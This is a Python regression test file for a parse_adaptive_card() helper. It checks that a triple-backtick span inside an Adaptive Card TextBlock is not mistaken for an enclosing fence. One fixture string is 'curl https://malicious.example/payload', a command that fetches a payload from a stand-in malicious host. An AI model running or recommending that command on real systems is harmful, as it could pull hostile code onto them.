"""
Regression tests for parse_adaptive_card() — a real bug where a triple-
backtick code span embedded inside a TextBlock's own text value (e.g. a
shell command or IOC the model wrapped in markdown) was mistaken for an
enclosing code fence, corrupting an otherwise-valid Adaptive Card and
silently falling back to raw, unformatted JSON text.
"""
import json

from app.utils.helpers import parse_adaptive_card


def _card(text: str) -> str:
    return json.dumps({"type": "AdaptiveCard", "body": [{"type": "TextBlock", "text": text}]})


def test_embedded_code_span_inside_text_block_is_not_mistaken_for_a_fence():
    raw = _card("Run: ```curl https://malicious.example/payload``` to check")
    card, fallback = parse_adaptive_card(raw)
    assert card is not None
    assert card["type"] == "AdaptiveCard"
    assert "curl https://malicious.example/payload" in fallback


def test_whole_json_wrapped_in_a_leading_fence_still_strips_correctly():
    raw = "```json\n" + _card("hello") + "\n```"
    card, _ = parse_adaptive_card(raw)
    assert card is not None
    assert card["type"] == "AdaptiveCard"


def test_plain_unwrapped_json_with_no_fence_parses_directly():
    raw = _card("hello")
    card, _ = parse_adaptive_card(raw)
    assert card is not None


def test_genuinely_invalid_output_falls_back_to_raw_text():
    raw = "Sorry, I could not find any results for that indicator."
    card, fallback = parse_adaptive_card(raw)
    assert card is None
    assert fallback == raw


def test_empty_response_returns_no_response_generated():
    card, fallback = parse_adaptive_card(None)
    assert card is None
    assert fallback == "No response generated."
